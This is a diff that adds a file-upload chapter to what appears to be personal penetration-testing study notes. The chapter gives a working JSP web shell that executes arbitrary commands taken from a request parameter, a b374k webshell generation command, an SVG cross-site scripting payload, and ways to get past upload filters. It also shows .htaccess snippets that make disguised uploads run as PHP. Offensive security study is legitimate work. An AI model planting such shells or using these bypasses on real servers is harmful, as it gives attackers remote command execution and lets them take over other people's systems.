@@ -184,3 +184,76 @@ JSON
 - Proxy: `--proxy="https://proxy.example.com:8080"`
 - Tor: `--tor`
 
+# Ch6 - File upload
+
+PHP functions used from os command execution
+- system
+- shell_exec
+- passthru
+- backticks
+- popen
+- exec
+- pcntl_exec
+- proc_open
+
+JSP shell
+```
+<%
+if (request.getParameter("cmd") != null) {
+    out.println("Output: " + request.getParameter("cmd") + "<br />");
+    Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
+    OutputStream os = p.getOutputStream();
+    InputStream in = p.getInputStream();
+    DataInputStream dis = new DataInputStream(in);
+    String disr = dis.readLine();
+    while ( disr != null ) {
+        out.println(disr); disr = dis.readLine();
+    }
+}
+%>
+```
+
+Multi-functional webshells: https://github.com/b374k/b374k
+```
+$ php -f index.php -- -o shell.php -p PASSWORD
+```
+
+We can upload files such as HTML or SVG to get XSS.
+```
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/
+Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/
+svg">
+<script type="text/javascript">
+alert("XSS: "+document.domain);
+</script>
+</svg>
+```
+
+Bypassing protections:
+- Case sensitive blacklisting `pHp`
+- MIME content type `text/php` to `image/gif`
+- Bad extension checks: `.jpg.php`
+
+Upload this as `.htacess` file. It executes
+any file containing _php.gif as a valid PHP.
+```
+<FilesMatch "_php.gif">
+SetHandler application/x-httpd-php
+</FilesMatch>
+```
+
+If you upload this as `.htacess` then any file
+with the extension `.lol` will execute as PHP.
+```
+AddType application/x-httpd-php .lol
+```
+
+Embedding code in images: http://www.thexifer.net
+
+Further reading
+- https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks
+- http://soroush.secproject.com/downloadable/iis-semicolon-report.pdf
+
+## Ch7 - Metasploit and web
